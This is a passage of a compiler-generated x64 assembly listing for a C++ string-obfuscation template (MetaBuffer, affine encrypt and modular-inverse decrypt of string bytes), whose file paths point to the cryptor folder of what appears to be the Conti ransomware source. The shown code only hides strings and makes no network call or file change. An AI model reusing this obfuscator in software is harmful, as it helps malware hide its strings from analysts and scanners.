  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 05	 imul	 eax, eax, 5
  0002d	83 c0 15	 add	 eax, 21
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@AEBAEE@Z ENDP ; MetaBuffer<5,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<5,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@QEBA_NXZ ; MetaBuffer<5,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 09	 cmp	 QWORD PTR i$1[rbp], 9
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@AEBAEE@Z ; MetaBuffer<5,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<5,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@QEBA_NXZ PROC ; MetaBuffer<5,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@QEBA_NXZ ENDP ; MetaBuffer<5,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv161 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<5,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::MetaBuffer<5,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@AEBAEE@Z ; MetaBuffer<5,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@AEBAEE@Z ; MetaBuffer<5,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@AEBAEE@Z ; MetaBuffer<5,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@AEBAEE@Z ; MetaBuffer<5,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@AEBAEE@Z ; MetaBuffer<5,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@AEBAEE@Z ; MetaBuffer<5,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@AEBAEE@Z ; MetaBuffer<5,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@AEBAEE@Z ; MetaBuffer<5,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@AEBAEE@Z ; MetaBuffer<5,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  001af	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  001b3	88 85 c0 00 00
	00		 mov	 BYTE PTR tv161[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  001b9	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  001c0	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  001c7	5f		 pop	 rdi
  001c8	5d		 pop	 rbp
  001c9	c3		 ret	 0
??0?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<5,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::MetaBuffer<5,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,68,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 44	 sub	 eax, 68			; 00000044H
  0002d	6b c0 dd	 imul	 eax, eax, -35		; ffffffffffffffddH
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,68,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,68,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 1d	 imul	 eax, eax, 29
  0002d	83 c0 44	 add	 eax, 68			; 00000044H
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,68,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<29,68,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEBA_NXZ ; MetaBuffer<29,68,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 05	 cmp	 QWORD PTR i$1[rbp], 5
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z ; MetaBuffer<29,68,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<29,68,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEBA_NXZ PROC ; MetaBuffer<29,68,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEBA_NXZ ENDP ; MetaBuffer<29,68,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv133 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<29,68,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::MetaBuffer<29,68,std::integer_sequence<unsigned __int64,0,1,2,3,4> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
